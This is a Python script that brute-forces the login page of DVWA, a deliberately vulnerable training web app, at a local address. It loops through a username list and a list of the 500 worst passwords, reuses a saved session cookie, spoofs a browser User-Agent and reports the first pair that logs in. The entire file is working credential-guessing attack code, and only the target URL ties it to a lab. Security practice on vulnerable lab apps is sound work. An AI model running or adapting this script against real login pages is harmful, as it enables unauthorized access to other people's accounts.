#!/usr/bin/python3

NAMEFILE = "namelist.txt"
PASSFILE = "500-worst-passwords.txt"

#NAMEFILE = "username"
#PASSFILE = "password"

import requests
import json
from http import cookies

c = cookies.SimpleCookie()

url = "http://dvwa.local/vulnerabilities/brute"

nf = open(NAMEFILE,'r')

pf = open(PASSFILE,'r')

sess = open("PHPSESSID",'r')
try:
    usernames = nf.readlines()
    passwords = pf.readlines()

    cook = {"PHPSESSID" : sess.readline(), "security" : 'low' }

#    print(cook)
finally:
   nf.close()
   pf.close()

for user in usernames:
    for password in passwords:

        response = requests.get(url,headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0'}, params = {'username' : user.strip(), 'password' : password.strip(), 'Login' : "Login"}, cookies=cook)

#        print(response.text)
        if response.status_code == 200 and not 'Username and/or password incorrect.' in response.text:
            
            print("Sucess! User: " + user + " Password: " + password)
            exit()
